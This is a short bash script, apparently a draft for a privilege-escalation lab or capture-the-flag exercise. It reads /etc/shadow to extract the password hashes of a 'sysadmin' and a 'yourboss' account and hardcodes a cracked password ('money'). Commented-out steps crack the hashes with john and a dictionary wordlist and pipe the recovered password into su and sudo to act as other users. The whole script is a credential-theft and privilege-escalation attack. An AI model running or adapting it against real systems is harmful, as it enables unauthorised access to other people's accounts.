#!/usr/bin/env bash

# Parse the shadow password file
 while IFS= read -r line; do
	if [ "${line:0:8}" = "sysadmin" ]; then
		sysadmin_hash=$line
	elif [ "${line:0:8}" = "yourboss" ]; then 
		yourboss_hash=$line
	fi
 done < /etc/shadow

# Crack the boss' password using custom method
# TODO: replaced yourboss_cracked with actual password for testing
 #./crack_password.py "$yourboss_hash" > temp.txt
 yourboss_cracked="money"
 #$(<temp.txt)
 echo $yourboss_cracked

 whoami

# echo "$yourboss_cracked" | su yourboss -S -c "whoami"
 
# Crack the sysadmin's password using john
# ./format_password.py "$sysadmin_hash" > temp_hash.txt
# sysadmin_hash=$(<temp_hash.txt)
# echo "$yourboss_cracked" | sudo -u yourboss john --wordlist=/usr/share/dict/american-english-small temp_hash.txt > temp.txt
# echo "$yourboss_cracked" | sudo -u yourboss john --show temp_hash.txt > temp.txt
# sysadmin_cracked=$(<temp.txt)
# echo $sysadmin_cracked

# Cleanup 
# rm temp.txt
# rm temp_hash.txt

